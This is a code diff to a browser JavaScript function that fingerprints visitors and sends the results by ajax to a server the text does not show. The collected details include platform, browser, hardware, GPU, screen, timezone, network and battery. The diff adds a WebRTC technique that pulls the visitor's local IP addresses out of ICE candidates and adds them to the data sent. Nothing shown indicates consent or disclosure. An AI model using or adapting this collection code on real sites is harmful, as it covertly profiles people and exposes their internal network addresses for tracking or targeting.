@@ -83,7 +83,7 @@ function information() {
   var net = conn ? conn.effectiveType + " (" + (conn.downlink || 0) + " Mbps)" : "Not Available";
   var touch = navigator.maxTouchPoints || 0;
 
-  var payload = { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, Lang: lang, Tz: tz, Net: net, Touch: touch, Bat: "Not Available" };
+  var payload = { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, Lang: lang, Tz: tz, Net: net, Touch: touch, Bat: "Not Available", Webrtc: "Not Available"};
 
   function sendData() {
     $.ajax({
@@ -95,17 +95,57 @@ function information() {
     });
   }
 
-  if (navigator.getBattery) {
-    navigator.getBattery().then(function(battery) {
-      var level = Math.round(battery.level * 100) + "%";
-      var isCharging = battery.charging ? "Charging ⚡" : "Unplugged 🔋";
-      payload.Bat = level + " - " + isCharging;
-      sendData();
-    }).catch(function() {
-      sendData();
-    });
-  } else {
-    sendData();
+  // WebRTC Local IP Extraction
+  var localIPs = [];
+  try {
+      var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+      if (RTCPeerConnection) {
+          var rtc = new RTCPeerConnection({ iceServers: [] });
+          if (1 || window.mozRTCPeerConnection) {
+              rtc.createDataChannel('', { reliable: false });
+          }
+          rtc.onicecandidate = function (evt) {
+              if (evt.candidate) {
+                  var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
+                  var ipMatch = evt.candidate.candidate.match(ipRegex);
+                  if (ipMatch) {
+                      var ip = ipMatch[0];
+                      if (!localIPs.includes(ip)) {
+                          localIPs.push(ip);
+                      }
+                  }
+              }
+          };
+          rtc.createOffer(function (offerDesc) {
+              rtc.setLocalDescription(offerDesc);
+          }, function (e) {});
+          
+          setTimeout(function() {
+              if (localIPs.length > 0) {
+                  payload.Webrtc = localIPs.join(", ");
+              }
+              triggerBatteryAndSend();
+          }, 500); // Wait 500ms for ICE candidates
+      } else {
+          triggerBatteryAndSend();
+      }
+  } catch(e) { 
+      triggerBatteryAndSend();
+  }
+
+  function triggerBatteryAndSend() {
+      if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+          var level = Math.round(battery.level * 100) + "%";
+          var isCharging = battery.charging ? "Charging ⚡" : "Unplugged 🔋";
+          payload.Bat = level + " - " + isCharging;
+          sendData();
+        }).catch(function() {
+          sendData();
+        });
+      } else {
+        sendData();
+      }
   }
 }
 
